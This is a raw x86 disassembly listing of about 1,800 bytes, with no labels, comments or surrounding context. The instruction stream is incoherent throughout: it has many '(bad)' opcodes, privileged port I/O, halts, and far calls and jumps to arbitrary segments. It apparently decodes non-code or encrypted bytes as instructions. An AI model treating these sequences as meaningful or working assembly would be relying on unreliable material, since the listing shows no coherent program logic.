  42216b:	fs sbb ebp,esp
  42216e:	mov    eax,ds:0xa6610af8
  422173:	iret   
  422174:	clc    
  422175:	lock mov edi,0xee72b782
  42217b:	in     al,0xa5
  42217d:	dec    ebx
  42217e:	data16 sbb al,0xa1
  422181:	in     al,0x14
  422183:	mov    eax,ds:0x1e29a084
  422188:	iret   
  422189:	jae    0x422173
  42218b:	outs   dx,BYTE PTR ds:[esi]
  42218c:	jmp    0xf27108bc
  422191:	fld    TBYTE PTR [edi+0x8]
  422194:	ds sbb ebp,ebx
  422197:	test   DWORD PTR [ebp+0x4a333160],ebp
  42219d:	cmp    al,0x62
  42219f:	sub    DWORD PTR [edx+0x5e7cde84],edi
  4221a5:	mov    bh,0xc4
  4221a7:	inc    edx
  4221a8:	vpunpckhdq ymm5,ymm7,YMMWORD PTR [ebx-0x75]
  4221ad:	pusha  
  4221ae:	xchg   ecx,eax
  4221af:	inc    eax
  4221b0:	popa   
  4221b1:	retf   
  4221b2:	das    
  4221b3:	leave  
  4221b4:	mov    ebp,0xf419ef9a
  4221b9:	nop
  4221ba:	pop    es
  4221bb:	inc    ecx
  4221bc:	inc    ebp
  4221bd:	fist   DWORD PTR [esi]
  4221bf:	mov    al,0xdd
  4221c1:	inc    edx
  4221c2:	push   es
  4221c3:	adc    al,0x4c
  4221c5:	popa   
  4221c6:	(bad)  
  4221c7:	adc    ecx,DWORD PTR [edx+0x60]
  4221ca:	mov    esp,DWORD PTR [eax+0x5e]
  4221cd:	mov    ecx,0x81b67d14
  4221d2:	sub    ebp,esp
  4221d4:	aam    0x60
  4221d6:	into   
  4221d7:	or     ecx,esp
  4221d9:	add    al,0x41
  4221db:	hlt    
  4221dc:	rcl    DWORD PTR [esi],0xdc
  4221df:	ret    0x655b
  4221e2:	push   ss
  4221e3:	loopne 0x42221c
  4221e5:	inc    esi
  4221e6:	scas   al,BYTE PTR es:[edi]
  4221e7:	and    eax,0xa1000e4f
  4221ec:	xchg   esi,eax
  4221ed:	xchg   DWORD PTR ds:0xc133ab58,edx
  4221f3:	(bad)  
  4221f4:	(bad)  
  4221f5:	sbb    al,0xee
  4221f7:	in     ax,dx
  4221f9:	pop    esi
  4221fa:	retf   
  4221fb:	sbb    ecx,DWORD PTR [edi-0x52]
  4221fe:	add    BYTE PTR [esi+0x2107ba29],cl
  422204:	dec    ebp
  422205:	cmp    ecx,ebx
  422207:	mov    bl,0xc2
  422209:	sub    dh,ch
  42220b:	imul   edx,DWORD PTR [ecx-0x1fc9b948],0x1df3bdf2
  422215:	pusha  
  422216:	pop    esp
  422217:	add    dl,BYTE PTR [ecx+0x7f]
  42221a:	xchg   esp,eax
  42221b:	pop    eax
  42221c:	and    eax,0x31f0fba4
  422221:	xlat   BYTE PTR ds:[ebx]
  422222:	out    dx,al
  422223:	push   ebp
  422224:	cmp    eax,0x99bf3393
  422229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42222a:	outs   dx,BYTE PTR ds:[esi]
  42222b:	mov    ebx,esp
  42222d:	mov    bh,0xb9
  42222f:	sub    BYTE PTR [ebx-0x4d],0xee
  422233:	fisubr WORD PTR [eax+0x74]
  422236:	data16 cmp dl,BYTE PTR [ebp-0x785ecf90]
  42223d:	rcr    DWORD PTR [ecx-0x3800d25d],0xb2
  422244:	inc    esp
  422245:	sub    eax,0xed5e0dcf
  42224a:	sahf   
  42224b:	pop    ebp
  42224c:	aas    
  42224d:	push   es
  42224e:	jge    0x4221f5
  422250:	out    0x47,al
  422252:	bound  ecx,QWORD PTR [ebx]
  422254:	in     al,0xe0
  422256:	retf   0x5c31
  422259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42225a:	sub    edx,DWORD PTR [edi-0x4]
  42225d:	xchg   ebp,eax
  42225e:	iret   
  42225f:	cmp    BYTE PTR [ebx-0x7c5d6dc5],ch
  422265:	push   esi
  422266:	inc    edi
  422267:	pop    edx
  422268:	lahf   
  422269:	fadd   QWORD PTR [eax-0x2c5b6892]
  42226f:	inc    edx
  422270:	hlt    
  422271:	out    0xee,eax
  422273:	xchg   ebx,eax
  422274:	daa    
  422275:	push   0xba2a2af0
  42227a:	jle    0x42221d
  42227c:	call   0x4c8c:0x7a76
  422282:	xchg   edi,eax
  422283:	inc    edi
  422284:	jb     0x4222a7
  422286:	add    DWORD PTR [edx+0x24ae4e69],edx
  42228c:	mov    ebx,0x14c6057a
  422291:	popa   
  422292:	bnd je 0x4222c4
  422295:	gs push 0xeb314580
  42229b:	mov    WORD PTR [ebx],gs
  42229d:	scas   al,BYTE PTR es:[edi]
  42229e:	sbb    dl,BYTE PTR [ecx-0x7924f25]
  4222a4:	add    DWORD PTR [edi],ebp
  4222a6:	fsub   DWORD PTR [eax+0x2c3311ed]
  4222ac:	xchg   ecx,eax
  4222ad:	jno    0x422249
  4222af:	xchg   DWORD PTR [esi-0x2a],ebx
  4222b2:	xchg   ecx,eax
  4222b3:	lods   al,BYTE PTR ds:[esi]
  4222b4:	adc    DWORD PTR [ebp+0x6b],0x1f
  4222b8:	icebp  
  4222b9:	enter  0xa19f,0x51
  4222bd:	inc    ecx
  4222be:	sub    DWORD PTR [ecx+0x45],ebx
  4222c1:	push   cs
  4222c2:	inc    edi
  4222c3:	mov    bl,0x4b
  4222c5:	mov    ecx,0xfe5ec9e2
  4222ca:	call   0x16ea:0xca968f7b
  4222d1:	popa   
  4222d2:	cmc    
  4222d3:	dec    ebp
  4222d4:	mov    ebp,0x7b8ddde
  4222d9:	pop    ebx
  4222da:	add    BYTE PTR [ebx],bh
  4222dc:	sti    
  4222dd:	sahf   
  4222de:	out    dx,al
  4222df:	jg     0x4222f9
  4222e1:	adc    dl,BYTE PTR [esp+edx*1]
  4222e4:	add    esp,DWORD PTR [eax+0x17]
  4222e7:	xor    DWORD PTR [edx-0x1],edi
  4222ea:	mov    ch,0x86
  4222ec:	sub    al,0xb9
  4222ee:	push   esp
  4222ef:	into   
  4222f0:	pop    esi
  4222f1:	and    DWORD PTR [ebx-0x65576e36],esp
  4222f7:	je     0x4222dd
  4222f9:	pusha  
  4222fa:	fdivr  QWORD PTR [ecx+0x38]
  4222fd:	mov    ebp,0x15214b46
  422302:	out    dx,al
  422303:	mov    dl,0x13
  422305:	adc    BYTE PTR [edi+0x7f863ea4],al
  42230b:	mov    eax,ds:0xf784eb69
  422310:	xchg   ebx,eax
  422311:	push   eax
  422312:	cmp    DWORD PTR [esi],eax
  422314:	pop    esi
  422315:	mov    esi,0xc0016322
  42231a:	add    al,0xcf
  42231c:	loop   0x42237e
  42231e:	or     bl,bh
  422320:	gs (bad) 
  422322:	cdq    
  422323:	mov    edx,ecx
  422325:	push   cs
  422326:	out    dx,al
  422327:	fist   WORD PTR [edx-0x53]
  42232a:	int    0xf0
  42232c:	and    ch,BYTE PTR [ebx-0x5c]
  42232f:	jmp    0x597e6d19
  422334:	push   cs
  422335:	popa   
  422336:	stos   DWORD PTR es:[edi],eax
  422337:	mov    ebp,DWORD PTR [ebp-0x317ee307]
  42233d:	fadd   QWORD PTR [esi-0x3472a487]
  422343:	jmp    0x41d6:0xc4d2ae5c
  42234a:	jb     0x42232e
  42234c:	hlt    
  42234d:	pop    ds
  42234e:	pop    es
  42234f:	pop    ss
  422350:	fild   QWORD PTR [eax+0x558d5d04]
  422356:	out    dx,al
  422357:	popa   
  422358:	sahf   
  422359:	repnz sub BYTE PTR [ecx-0x5d7b4e77],0x21
  422361:	xchg   DWORD PTR [esi-0x26],eax
  422364:	fimul  DWORD PTR [eax]
  422366:	repnz and BYTE PTR [ebx+0x9a9ee07],0x51
  42236e:	xor    al,0x20
  422370:	mov    ah,0x42
  422372:	jmp    0x56172617
  422377:	ins    DWORD PTR es:[edi],dx
  422378:	sahf   
  422379:	test   eax,0xa35eceaf
  42237e:	cmp    DWORD PTR [ebp-0x79c4bf7e],ebx
  422384:	xchg   edi,eax
  422385:	test   al,0x16
  422387:	mov    al,ds:0x5fa7c3c3
  42238c:	pop    esi
  42238d:	mov    edx,0x65b4ab44
  422392:	in     eax,0xe6
  422394:	cmp    cl,al
  422396:	lahf   
  422397:	inc    edx
  422398:	pop    edi
  422399:	mov    bl,0xfd
  42239b:	and    bl,BYTE PTR [ebx-0x6]
  42239e:	cs jbe 0x422364
  4223a1:	sub    al,0x12
  4223a3:	lahf   
  4223a4:	retf   0x8146
  4223a7:	pop    es
  4223a8:	jle    0x4223a1
  4223aa:	jae    0x422372
  4223ac:	adc    DWORD PTR [edx-0x12],0xa5819be6
  4223b3:	pop    esi
  4223b4:	sbb    eax,0x2fa15ca5
  4223b9:	icebp  
  4223ba:	shr    BYTE PTR [ecx+0x19cbacf0],1
  4223c0:	pop    esi
  4223c1:	inc    eax
  4223c2:	inc    esi
  4223c3:	cmp    BYTE PTR [ebx-0x73],ah
  4223c6:	push   ss
  4223c7:	repnz aam 0x60
  4223ca:	xchg   esp,eax
  4223cb:	jbe    0x4223c2
  4223cd:	pop    ebx
  4223ce:	xor    ecx,ebx
  4223d0:	push   ss
  4223d1:	jo     0x4223bc
  4223d3:	cli    
  4223d4:	std    
  4223d5:	push   ds
  4223d6:	imul   BYTE PTR [eax+0x23b8d69e]
  4223dc:	enter  0xde5d,0x75
  4223e0:	fstp   DWORD PTR [edi-0x6d]
  4223e3:	push   cs
  4223e4:	jle    0x422448
  4223e6:	mov    ah,0xc6
  4223e8:	pop    esi
  4223e9:	push   ebx
  4223ea:	xor    ecx,DWORD PTR [ebx+0x4e453ea8]
  4223f0:	mov    esi,0xa99ebb25
  4223f5:	ret    
  4223f6:	in     al,0xb2
  4223f8:	ds stos DWORD PTR es:[edi],eax
  4223fa:	cmp    DWORD PTR [edx],edi
  4223fc:	jmp    0xf7421266
  422401:	xchg   esi,eax
  422402:	repz pop ebp
  422404:	jl     0x4223b1
  422406:	and    eax,0x59ec0a4
  42240b:	xchg   edi,eax
  42240c:	stos   BYTE PTR es:[edi],al
  42240d:	nop
  42240e:	xchg   BYTE PTR [esi],bh
  422410:	jnp    0x42247c
  422412:	sahf   
  422413:	icebp  
  422414:	dec    esp
  422415:	sbb    BYTE PTR [edx+0x3c],bl
  422418:	push   ebx
  422419:	inc    eax
  42241a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241b:	and    DWORD PTR [esi+0x1d456f0e],esi
  422421:	and    al,0x48
  422423:	scas   eax,DWORD PTR es:[edi]
  422424:	pusha  
  422425:	mov    edi,esp
  422427:	inc    ebp
  422428:	jo     0x4223ce
  42242a:	imul   DWORD PTR [esi-0x42]
  42242d:	mov    esp,0xed741461
  422432:	out    dx,al
  422433:	out    dx,al
  422434:	arpl   WORD PTR [ebx-0x64],dx
  422437:	mov    ds:0xdcf19bd3,eax
  42243c:	aad    0xa6
  42243e:	jmp    0x2c8dcf12
  422443:	popa   
  422444:	jns    0x422422
  422446:	mov    ebp,0x84d53f1
  42244b:	cmp    eax,0x36fe791e
  422450:	and    bh,BYTE PTR [ecx+0x16a29ee7]
  422456:	fld    TBYTE PTR [edx+0x3e]
  422459:	cmp    eax,0x8ee65e49
  42245e:	out    dx,al
  42245f:	fdiv   DWORD PTR [ebp+eax*8-0x5300d2ca]
  422466:	pop    esp
  422467:	mov    eax,ds:0xada105a3
  42246c:	ficomp DWORD PTR [ecx-0x257f47ea]
  422472:	sti    
  422473:	ins    DWORD PTR es:[edi],dx
  422474:	sar    BYTE PTR [edx-0x12],1
  422477:	xchg   ecx,eax
  422478:	ss test cl,dl
  42247b:	stos   BYTE PTR es:[edi],al
  42247c:	(bad)  
  42247e:	add    ch,BYTE PTR [eax-0x24da3d81]
  422484:	into   
  422485:	mov    al,ds:0x2582ef3e
  42248a:	out    0x31,eax
  42248c:	dec    ecx
  42248d:	cmp    ch,bl
  42248f:	idiv   DWORD PTR [esi]
  422491:	dec    eax
  422492:	shr    DWORD PTR [esi-0x5ebfd99d],cl
  422498:	adc    DWORD PTR [ecx+0x69e00f3e],0xff5e99a2
  4224a2:	jl     0x422430
  4224a4:	nop
  4224a5:	push   eax
  4224a6:	xchg   ebp,eax
  4224a7:	aas    
  4224a8:	cmp    BYTE PTR [ecx+ecx*8-0x1d],al
  4224ac:	dec    edi
  4224ad:	out    0x6e,al
  4224af:	ret    0x6fcb
  4224b2:	xchg   esp,eax
  4224b3:	lock fdiv QWORD PTR [eax+0xa36f152]
  4224ba:	int    0x27
  4224bc:	inc    ecx
  4224bd:	push   esp
  4224be:	cmp    al,0x65
  4224c0:	(bad)  
  4224c1:	jmp    0x4224fb
  4224c3:	mov    gs,WORD PTR [ecx+eiz*2]
  4224c6:	sahf   
  4224c7:	outs   dx,BYTE PTR ds:[esi]
  4224c8:	add    edi,DWORD PTR [ebx+0x75591175]
  4224ce:	out    dx,al
  4224cf:	popa   
  4224d0:	push   edx
  4224d1:	mov    ss,WORD PTR [eax]
  4224d3:	sub    BYTE PTR [eax+0x56],ch
  4224d6:	and    BYTE PTR [ecx+0xe],ch
  4224d9:	popa   
  4224da:	jge    0x4224bf
  4224dc:	mov    DWORD PTR [eax-0x3d4cd470],ebx
  4224e2:	out    dx,al
  4224e3:	lea    eax,ds:0xc103ae4f
  4224e9:	or     DWORD PTR [eax+0x77],0x796f4382
  4224f0:	mov    eax,ds:0x6e8dd60
  4224f5:	jns    0x4224ba
  4224f7:	xchg   esi,eax
  4224f8:	pop    esi
  4224f9:	das    
  4224fa:	jg     0x4224fb
  4224fc:	jmp    0x42249c
  4224fe:	mov    ah,0xfa
  422500:	mov    ah,0x60
  422502:	lahf   
  422503:	popf   
  422504:	stos   DWORD PTR es:[edi],eax
  422505:	xchg   esp,eax
  422506:	stos   DWORD PTR es:[edi],eax
  422507:	cmp    al,0xa
  422509:	jbe    0x4224f9
  42250b:	sub    ah,ah
  42250d:	cld    
  42250e:	outs   dx,BYTE PTR ds:[esi]
  42250f:	add    DWORD PTR [ebp-0x6a5efd94],eax
  422515:	mov    es:0x179f00a8,eax
  42251b:	ins    DWORD PTR es:[edi],dx
  42251c:	fisub  WORD PTR fs:[eax+0x76]
  422520:	fsub   DWORD PTR [eax-0x38]
  422523:	or     DWORD PTR [ebp-0x3d],0xa
  422527:	mov    eax,ds:0x5f738e89
  42252c:	cmp    eax,0x74d0d9e4
  422531:	and    dh,al
  422533:	mov    bh,0x3f
  422535:	mov    dl,0x72
  422537:	loope  0x4224c4
  422539:	mov    WORD PTR [edx],ss
  42253b:	adc    DWORD PTR [esi],edi
  42253d:	popa   
  42253e:	mov    ah,0xcb
  422540:	or     al,0x10
  422542:	sar    BYTE PTR ds:0xbaebedb3,cl
  422548:	or     ecx,esi
  42254a:	jb     0x4224fe
  42254c:	imul   eax,eax,0xffffffb0
  42254f:	push   ecx
  422550:	inc    edi
  422551:	popa   
  422552:	or     esp,DWORD PTR [ebp+0x238a03da]
  422558:	mov    DWORD PTR [edi],0x205837ee
  42255e:	hlt    
  42255f:	mov    dh,0x6a
  422561:	pop    ecx
  422562:	sub    esp,DWORD PTR [ecx-0x500d59d8]
  422568:	xlat   BYTE PTR ds:[ebx]
  422569:	inc    esp
  42256a:	stos   DWORD PTR es:[edi],eax
  42256b:	sub    al,0x5e
  42256d:	dec    eax
  42256e:	and    ah,ch
  422570:	js     0x422527
  422572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422573:	pop    es
  422574:	icebp  
  422575:	pusha  
  422576:	dec    DWORD PTR ds:0xa64cf0cd
  42257c:	scas   eax,DWORD PTR es:[edi]
  42257d:	jmp    0xfce0:0x328b16ed
  422584:	bound  ebx,QWORD PTR [ebx+0x2e]
  422587:	cmp    BYTE PTR [edx-0xa21fbb6],0x60
  42258e:	std    
  42258f:	inc    ebx
  422590:	or     eax,0x635d5e17
  422595:	sub    ah,BYTE PTR [ebx+0x1f5ec5d7]
  42259b:	mov    DWORD PTR [edi-0x40],edi
  42259e:	call   0x6dc7:0x3961315f
  4225a5:	or     cl,ah
  4225a7:	ret    0x6c15
  4225aa:	fild   WORD PTR [edx]
  4225ac:	pop    esi
  4225ad:	std    
  4225ae:	jo     0x4225b6
  4225b0:	(bad)  
  4225b1:	lods   eax,DWORD PTR ds:[esi]
  4225b2:	pop    eax
  4225b3:	pop    es
  4225b4:	dec    ebp
  4225b5:	popa   
  4225b6:	js     0x42261f
  4225b8:	xchg   edi,eax
  4225b9:	jmp    0x1bee:0x469e23bb
  4225c0:	sti    
  4225c1:	pop    ds
  4225c2:	xchg   ebp,eax
  4225c3:	data16 jecxz 0x422595
  4225c6:	bound  esp,QWORD PTR [ecx+0x7dff7216]
  4225cc:	pop    esp
  4225cd:	lds    edi,FWORD PTR [esp+ebp*1-0x5ac0ff9d]
  4225d4:	xor    eax,0x4005959e
  4225d9:	add    DWORD PTR [edx],esp
  4225db:	adc    BYTE PTR [eax+eiz*2-0x7998a934],dl
  4225e2:	sti    
  4225e3:	call   0x97b2:0x9f0a946d
  4225ea:	out    dx,al
  4225eb:	loop   0x422604
  4225ed:	int    0x39
  4225ef:	sbb    ah,ch
  4225f1:	inc    eax
  4225f2:	mov    eax,ds:0x62c42f41
  4225f7:	(bad)  
  4225f8:	pop    esi
  4225f9:	jl     0x4225da
  4225fb:	xchg   esp,eax
  4225fc:	aas    
  4225fd:	jg     0x422596
  4225ff:	pop    ss
  422600:	add    BYTE PTR [ebx+0x29],0xdc
  422604:	jne    0x42259f
  422606:	shr    BYTE PTR [eax-0x26],1
  422609:	add    BYTE PTR [ebx-0x11aa23b8],ch
  42260f:	daa    
  422610:	cmp    eax,0xd19f7dba
  422615:	aad    0x69
  422617:	lahf   
  422618:	push   eax
  422619:	jmp    0x1740e77c
  42261e:	clc    
  42261f:	cli    
  422620:	jne    0x4225d7
  422622:	in     eax,dx
  422623:	call   0x2e5a:0x76cd551
  42262a:	inc    edx
  42262b:	push   esp
  42262c:	jecxz  0x42268e
  42262e:	pop    ebp
  42262f:	mov    edi,0x2e436fff
  422634:	adc    al,ah
  422636:	out    dx,al
  422637:	scas   al,BYTE PTR es:[edi]
  422638:	sub    ebp,DWORD PTR [ecx]
  42263a:	in     al,dx
  42263b:	adc    DWORD PTR [edx+0x77],ecx
  42263e:	jo     0x4225e4
  422640:	dec    ebx
  422641:	and    eax,0x9e45f9e4
  422646:	outs   dx,BYTE PTR ds:[esi]
  422647:	je     0x422638
  422649:	out    dx,al
  42264a:	in     al,dx
  42264b:	mul    BYTE PTR [edi]
  42264d:	popf   
  42264e:	rcr    edi,cl
  422650:	cld    
  422651:	and    ah,dh
  422653:	es sbb al,0x61
  422656:	inc    ecx
  422657:	adc    dh,ah
  422659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42265a:	rcl    DWORD PTR [eax-0x56],0xd0
  42265e:	in     al,dx
  42265f:	ins    BYTE PTR es:[edi],dx
  422660:	push   0xd8099f62
  422665:	mov    al,ds:0x612b5fb1
  42266a:	xchg   edi,eax
  42266b:	cs mov esi,0x16210c22
  422671:	mov    eax,ds:0xb82712ee
  422676:	jecxz  0x42268e
  422678:	dec    ecx
  422679:	jp     0x4226a2
  42267b:	hlt    
  42267c:	xchg   edx,eax
  42267d:	arpl   ax,dx
  42267f:	cli    
  422680:	pop    ebp
  422681:	push   esp
  422682:	arpl   WORD PTR [edx+0x4d520274],bp
  422688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422689:	push   ds
  42268a:	out    dx,al
  42268b:	(bad)  
  42268d:	cmp    DWORD PTR [eax],0xffffffd1
  422690:	(bad)  
  422691:	call   0xd86e:0x41c0acdb
  422698:	in     al,0x7
  42269a:	dec    eax
  42269b:	and    ebx,DWORD PTR [edi-0x1b]
  42269e:	and    cl,dh
  4226a0:	xchg   esp,eax
  4226a1:	ret    
  4226a2:	mov    bl,0xc0
  4226a4:	push   ds
  4226a5:	scas   al,BYTE PTR es:[edi]
  4226a6:	scas   al,BYTE PTR es:[edi]
  4226a7:	mov    ebx,0xa89d61b0
  4226ac:	sbb    ecx,DWORD PTR [ecx+0x5f]
  4226af:	push   0x71
  4226b1:	rol    BYTE PTR [eax+0x1fd27beb],1
  4226b7:	dec    DWORD PTR [ebx+0x589f1ae0]
  4226bd:	and    BYTE PTR [ecx],0xa2
  4226c0:	xchg   esp,eax
  4226c1:	popa   
  4226c2:	mov    WORD PTR [ebp+0x67ac6077],fs
  4226c8:	scas   al,BYTE PTR es:[edi]
  4226c9:	mov    dl,0x53
  4226cb:	sti    
  4226cc:	fcomp  QWORD PTR [ebp-0x12]
  4226cf:	or     eax,0x91b3930d
  4226d4:	stos   BYTE PTR es:[edi],al
  4226d5:	rcr    BYTE PTR [edi-0x5f],cl
  4226d8:	mov    bl,ch
  4226da:	and    eax,0xd785a15b
  4226df:	outs   dx,BYTE PTR fs:[esi]
  4226e1:	cmp    ch,dh
  4226e3:	jns    0x42266c
  4226e5:	lods   al,BYTE PTR ds:[esi]
  4226e6:	ret    0x3d47
  4226e9:	fadd   DWORD PTR ds:0x7d76b5a2
  4226ef:	(bad)  
  4226f0:	adc    ebp,DWORD PTR [esi]
  4226f2:	push   edx
  4226f3:	jne    0x422767
  4226f5:	pop    ecx
  4226f6:	out    dx,al
  4226f7:	fwait
  4226f8:	dec    ebx
  4226f9:	mov    ebp,0x5f4dc3bc
  4226fe:	sbb    ah,BYTE PTR [edx-0x2ab0bdc6]
  422704:	mov    edx,0xf3612a23
  422709:	jns    0x4226f9
  42270b:	call   0xf4e78358
  422710:	adc    BYTE PTR [ebx],cl
  422712:	push   edi
  422713:	mov    eax,ds:0x6f1ed853
  422718:	in     al,0x34
  42271a:	inc    ebx
  42271b:	jne    0x42277b
  42271d:	xchg   edx,eax
  42271e:	pushf  
  42271f:	fist   WORD PTR [esi+0x2e]
  422722:	jmp    0x4226c2
  422724:	lahf   
  422725:	pusha  
  422726:	xchg   ebp,eax
  422727:	aad    0xad
  422729:	addr16 ja 0x42277e
  42272c:	rcl    BYTE PTR [ebp-0x12],1
  42272f:	pop    eax
  422730:	arpl   WORD PTR [ecx+0x6f],ax
  422733:	or     BYTE PTR [ebp-0x19],0xd0
  422737:	mov    eax,ds:0x362e5dd1
  42273c:	push   ebx
  42273d:	dec    esp
  42273e:	push   cs
  42273f:	push   ebp
  422740:	(bad)  
  422741:	enter  0x90ee,0xc0
  422745:	shr    DWORD PTR [esi+0x2a],0x46
  422749:	ror    DWORD PTR [ebx],cl
  42274b:	mov    eax,ds:0x936c4a7f
  422750:	mov    bh,0x92
  422752:	jb     0x422781
  422754:	push   ecx
  422755:	jbe    0x4227a8
  422757:	nop    eax
  42275a:	add    edi,DWORD PTR [ebp+0x7e]
  42275d:	inc    ecx
  42275e:	lock mov al,0xb1
  422761:	pusha  
  422762:	ss pushf 
  422764:	mov    bh,BYTE PTR [ecx-0x3abccd30]
  42276a:	jmp    0x42277f
  42276c:	(bad)  
  42276d:	adc    ebp,DWORD PTR [esi+0x65]
  422770:	jg     0x42276a
  422772:	out    0xad,eax
  422774:	frstor [eax-0x23]
  422777:	out    0xdb,al
  422779:	inc    edx
  42277a:	(bad)  
  42277b:	cdq    
  42277c:	adc    BYTE PTR [ebp+0x5ea6faee],al
  422782:	push   cs
  422783:	cli    
  422784:	adc    dl,BYTE PTR [esi-0x65]
  422787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422788:	outs   dx,BYTE PTR ds:[esi]
  422789:	or     bh,BYTE PTR [eax]
  42278b:	or     DWORD PTR [esi*1+0x7926d2ee],edx
  422792:	xchg   ecx,eax
  422793:	in     al,0x62
  422795:	jecxz  0x4227e0
  422797:	stos   DWORD PTR es:[edi],eax
  422798:	out    dx,eax
  422799:	mov    edx,0xfcd10c6e
  42279e:	call   DWORD PTR [eax]
  4227a0:	xchg   ecx,eax
  4227a1:	imul   ebx,eax,0xf13d5ed0
  4227a7:	push   ss
  4227a8:	xchg   edi,eax
  4227a9:	cmp    eax,DWORD PTR [edx+0x2e612d0f]
  4227af:	mov    WORD PTR [edi],cs
  4227b1:	push   edx
  4227b2:	and    BYTE PTR [ebx],dh
  4227b4:	repz out 0xc8,ax
  4227b8:	jno    0x422792
  4227ba:	mov    ecx,0xfb2c7d16
  4227bf:	jmp    0xa02baf3e
  4227c4:	loopne 0x422765
  4227c6:	xchg   ebx,eax
  4227c7:	aad    0xe3
  4227c9:	repnz mov ?,WORD PTR ds:0xf2625566
  4227d0:	pop    esi
  4227d1:	xchg   ecx,eax
  4227d2:	and    ah,BYTE PTR [edi+eax*4-0x23]
  4227d6:	mov    ch,0x5e
  4227d8:	cdq    
  4227d9:	pusha  
  4227da:	call   0x362b1078
  4227df:	rcr    BYTE PTR [esi+0x55afeeb7],1
  4227e5:	shl    DWORD PTR [edx],cl
  4227e7:	xor    DWORD PTR [ebp-0x1d],0x27878ecf
  4227ee:	mov    cs,WORD PTR ds:0x2794a0d3
  4227f4:	mov    WORD PTR [ecx-0x5],ss
  4227f7:	retf   0x624a
  4227fa:	cmp    eax,0x2326b140
  4227ff:	sbb    edi,DWORD PTR [eax+eiz*8+0x3b]
  422803:	lds    eax,FWORD PTR [ebx-0x221953e9]
  422809:	pusha  
  42280a:	ficom  DWORD PTR [ebp-0x5]
  42280d:	jle    0x4227d0
  42280f:	(bad)  
  422810:	mov    esi,0x27b3ee3b
  422815:	and    dh,BYTE PTR [ecx]
  422817:	adc    al,0x7
  422819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42281a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42281b:	lods   eax,DWORD PTR ds:[esi]
  42281c:	sub    BYTE PTR [eax+0x67],bh
  42281f:	sub    al,0x56
  422821:	pop    esp
  422822:	xchg   BYTE PTR [eax],bh
  422824:	test   al,0x3d
  422826:	pop    ebp
  422827:	xchg   ebp,eax
  422828:	sahf   
  422829:	and    esi,ecx
  42282b:	and    al,0x5e
  42282d:	pop    ebp
  42282e:	stos   BYTE PTR es:[edi],al
  42282f:	or     esp,eax
  422831:	dec    edx
  422832:	scas   al,BYTE PTR es:[edi]
  422833:	lods   eax,DWORD PTR ds:[esi]
  422834:	push   0x248e1c61
  422839:	mov    esp,0x1d1caf3
  42283e:	out    dx,al
  42283f:	sub    dl,BYTE PTR [ebx-0x6e]
  422842:	xor    al,0x7f
  422844:	mov    BYTE PTR [ecx-0x61355ef7],cl
  42284a:	ja     0x4227fb
  42284c:	and    DWORD PTR [edi],ebx
  42284e:	cmp    DWORD PTR [edi],0x211afc31
  422854:	inc    ecx
  422855:	fiadd  DWORD PTR [ebx]
  422857:	mov    ah,0x9f
  422859:	mov    dl,0xa0
  42285b:	mov    al,ds:0xc86a7740
  422860:	pop    esi
  422861:	(bad)  
  422862:	jmp    0x780b:0xe26e794c
  422869:	aam    0xee
  42286b:	adc    DWORD PTR [esi+0xc961e27],esp
  422871:	cmp    BYTE PTR [esi],dl
  422873:	nop
  422874:	gs pop edi
  422876:	inc    eax
  422877:	and    BYTE PTR [edx-0x214caf19],bl
  42287d:	or     eax,0x2fec3277
  422882:	out    dx,al
  422883:	add    al,0x4e
  422885:	jmp    0x67757f82
  42288a:	mov    dh,0xa3
  42288c:	mov    ds:0xf643c09f,al
  422891:	sbb    DWORD PTR [esi-0x4f],ecx
  422894:	and    dl,BYTE PTR [ebp-0x12]
  422897:	enter  0xdeaa,0xae
  42289b:	adc    BYTE PTR [edi-0x3e],ch
  42289e:	dec    esi
  42289f:	mov    ds:0x6d09997a,eax
  4228a4:	sbb    BYTE PTR [esi+ebp*1-0x61],ch
  4228a8:	call   0x78f2:0x5fdde17a
  4228af:	push   0xffffffb7
  4228b1:	test   eax,0x2b096100
  4228b6:	test   al,dh
  4228b8:	sbb    eax,0xa2f4f61
  4228bd:	jp     0x4228a2
  4228bf:	int3   
  4228c0:	jl     0x422861
  4228c2:	out    dx,al
  4228c3:	mov    ds:0xbe0a98a0,eax
  4228c8:	pop    esp
  4228c9:	(bad)  
  4228ca:	mov    eax,ds:0xcbf27fa0
  4228cf:	inc    eax
  4228d0:	sahf   
  4228d1:	or     edi,0xe7a3bd08
  4228d7:	daa    
  4228d8:	or     BYTE PTR [edx+eiz*1-0x75],bl
  4228dc:	ds test al,0x59
  4228df:	ret    
  4228e0:	cmc    
  4228e1:	pusha  
  4228e2:	adc    al,0x99
  4228e4:	shl    BYTE PTR [eax+0x19eb9f3b],1
  4228ea:	cmc    
  4228eb:	mov    cl,0xc5
  4228ed:	retf   0x2125
  4228f0:	add    BYTE PTR [ecx+ebx*1],al
  4228f3:	xchg   ecx,eax
  4228f4:	(bad)  
  4228f5:	pop    edi
  4228f6:	repz ret 0x2c84
  4228fa:	cmp    eax,0xb9914c9d
  4228ff:	mov    al,0x5e
  422901:	dec    edx
  422902:	in     al,dx
  422903:	and    eax,DWORD PTR [ebx+0x3a]
  422906:	fistp  QWORD PTR [edx]
  422908:	mov    ebx,0xe78d7960
  42290d:	idiv   DWORD PTR [ebp+0x44]
  422910:	pop    ecx
  422911:	mov    esp,0xe2d833ee
  422916:	lods   al,BYTE PTR ds:[esi]
  422917:	loopne 0x4228e3
  422919:	push   ss
  42291a:	inc    esi
  42291b:	sub    DWORD PTR [edx],eax
  42291d:	popa   
  42291e:	jno    0x4228d5
  422920:	mov    gs,esi
  422922:	out    0x44,eax
  422924:	fisub  DWORD PTR [edi+edi*8+0x7]
  422928:	mov    eax,0xb271ee25
  42292d:	pop    edi
  42292e:	popf   
  42292f:	stc    
  422930:	out    0x60,al
  422932:	jns    0x42293a
  422934:	and    DWORD PTR [edx+0x247d32f2],ebp
  42293a:	out    dx,al
  42293b:	pop    ecx
  42293c:	sbb    DWORD PTR [ecx-0x52f8fc1a],0x73
  422943:	in     eax,dx
  422944:	mov    ebp,0x6992c260
